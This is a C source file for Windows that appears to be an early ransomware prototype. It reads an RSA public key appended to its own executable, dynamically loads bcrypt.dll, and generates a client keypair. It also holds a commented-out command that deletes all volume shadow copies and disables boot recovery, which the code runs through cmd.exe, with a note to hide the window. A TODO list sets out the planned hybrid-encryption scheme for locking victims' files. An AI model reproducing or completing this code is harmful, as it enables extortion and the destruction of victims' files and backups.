#include "util.h"
#include "crypt.h"

//#define RM_SHADOW_BACKUPS "/c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures"
#define RM_SHADOW_BACKUPS	"/c pause"

#define SIZEOF_ARRAY(arr)	(sizeof(arr) / sizeof(arr[0]))

void
ftok(char *self, HINSTANCE *hinst, Keypair *k)
{
	FILE *f;
	HRSRC rs;
	HGLOBAL grs;
	BCRYPT_ALG_HANDLE alghandle;
	/* Read the key size */
	if (!(f = fopen(self, "rb")))
		die("Failed to open self");
	if (fseek(f, -sizeof(unsigned), SEEK_END))
		die("Failed to fseek self");
	if (fread(&(k->size), 1, sizeof(unsigned), f) != sizeof(unsigned))
		die("Failed to fread pubkey");
	/* malloc key */
	if (!(k->blob = malloc(k->size)))
		die("Failed to malloc pubkey");
	/* Read the key, SEEK_CUR -> skip last 4 bytes sizeof(unsigned) */
	if (fseek(f, -(k->size + sizeof(unsigned)), SEEK_CUR))
		die("Failed to fseek self");
	if (fread(k->blob, 1, k->size, f) != k->size)
		die("Failed to fread pubkey");
	fclose(f);
	/* BCryptOpenAlgorithmProvider */
	if (adrof(*hinst, "BCryptOpenAlgorithmProvider")(&alghandle, BCRYPT_RSA_ALGORITHM, 0, 0))
		die("Failed to call BCryptOpenAlgorithmProvider");
	/* BCryptImportKeyPair */
	if (adrof(*hinst, "BCryptImportKeyPair")(alghandle, 0, BCRYPT_RSAPUBLIC_BLOB, &(k->khandle), k->blob, k->size, 0))
		die("Failed to BCryptImportKeyPair");
	/* BCryptCloseAlgorithmProvider */
	adrof(*hinst, "BCryptCloseAlgorithmProvider")(alghandle, 0);
}

int
main(int argc, char **argv)
{
	/* TODO:
	 * [X] Read RSA pubkey
	 * [X] Remove shadow backups
	 * [X] dynamically load crypt32.dll | https://docs.microsoft.com/en-us/windows/win32/dlls/using-run-time-dynamic-linking
	 * [X] Generate Client RSA key pair
	 * [] Encrypt Client RSA privkey with Server RSA pubkey
	 * [] Remove Client RSA privkey
	 * [] Generate AES key
	 * [] Encrypt file with AES
	 * [] Encrypt AES key with Client pubkey
	 * [] Remove AES key
	 * [] Save encrypted AES key
	*/
	HINSTANCE hinst;
	Keypair *sk, *ck;

	if (!(hinst = LoadLibrary("bcrypt.dll")))
		die("Failed to load bcrypt.dll");

	ShellExecute(NULL, "open", "cmd.exe", RM_SHADOW_BACKUPS, NULL, SW_SHOW); /* TODO: Change to SW_HIDE */

	/* malloc Keypair structs */
	if (!(ck = malloc(sizeof(Keypair))))
		die("Failed to malloc Keypair struct");
	if (!(sk = malloc(sizeof(Keypair))))
		die("Failed to malloc Keypair struct");
	/* Read server pubkey */
	ftok(argv[0], &hinst, sk);
	/* Gen RSA keypair */
	rsa_gen_key(&hinst, ck);
	/* key to privkey blob */
	ktob(&hinst, ck, BCRYPT_RSAPRIVATE_BLOB);
	/* encrypt privkey with server pubkey */

	/* BCryptDestroyKey */
	if (adrof(hinst, "BCryptDestroyKey")(ck->khandle))
		die("Failed to BCryptDestroyKey");
	if (adrof(hinst, "BCryptDestroyKey")(sk->khandle))
		die("Failed to BCryptDestroyKey");
	/* cleanup */
	free(sk->blob);
	free(ck->blob);
	free(ck);
	free(sk);
	FreeLibrary(hinst);
	return 0;
}

